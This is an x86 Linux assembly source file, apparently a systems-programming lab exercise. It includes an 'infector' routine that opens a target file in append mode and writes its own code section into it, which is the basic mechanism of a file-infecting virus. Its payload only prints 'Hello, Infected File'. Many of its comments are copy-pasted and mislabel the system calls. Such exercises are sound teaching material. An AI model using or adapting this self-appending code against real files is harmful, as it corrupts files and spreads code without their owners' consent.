section .data
    msg  db  'Hello, Infected File' ,0xa ;our string
    len  equ  $ - msg            ;length of our string

section .text
    global _start
    global system_call
    global code_start
    global infection
    global infector
    global code_end
    extern main
    
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, 4          ; Copy function args to registers: leftmost...    ; SYSWRITE    
    mov     ebx, 1          ; Next argument...   ;STDOUT
    mov     ecx, msg      ; Next argument...  ;STRING
    mov     edx, len      ; Next argument... ; length of string
    int     0x80            ; Transfer control to operating system
    
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller 


infector:
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad                  ; Save some more caller state
     
    open:                        ;OPEN
    mov     eax, 5          ; Copy function args to registers: leftmost...    ; SYSWRITE    
    mov     ebx, [ebp + 8]        ; Next argument...   ;STDOUT
    mov     ecx,  1025    ; Next argument...  ;STRING
    mov     edx, 0777      ; Next argument... ; length of string
    int     0x80            ; Transfer control to operating system
    mov     esi, eax    ; Save returned value...
   
    write:
    mov     eax, 4          ; Copy function args to registers: leftmost...    ; SYSWRITE    
    mov     ebx, esi         ; Next argument...   ;STDOUT
    mov     ecx, code_start      ; Next argument...  ;STRING
    mov     edx, code_end      ; Next argument... ; length of string
    sub     edx, ecx
    int     0x80            ; Transfer control to operating system
 
    close:                  ;CLOSE
    mov     eax, 6          ; Copy function args to registers: leftmost...    ; SYSWRITE    
    mov     ebx, esi      ; Next argument...  ;STRING
    int     0x80            ; Transfer control to operating system  

    popad                   ; Restore caller state (registers)
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller 

    ; push 0777
    ; push dword [ebp + 8]
    ; push 1025
    ; push 5
    ; call system_call
    ; mov edi, eax
    

    ; push len 
    ; push msg
    ; push 1
    ; push 4
    ; call system_call

    ; push 0
    ; push 0
    ; push edi
    ; push 6
    ; call system_call
    ; cmp eax, 0
    ; jae infection

code_end: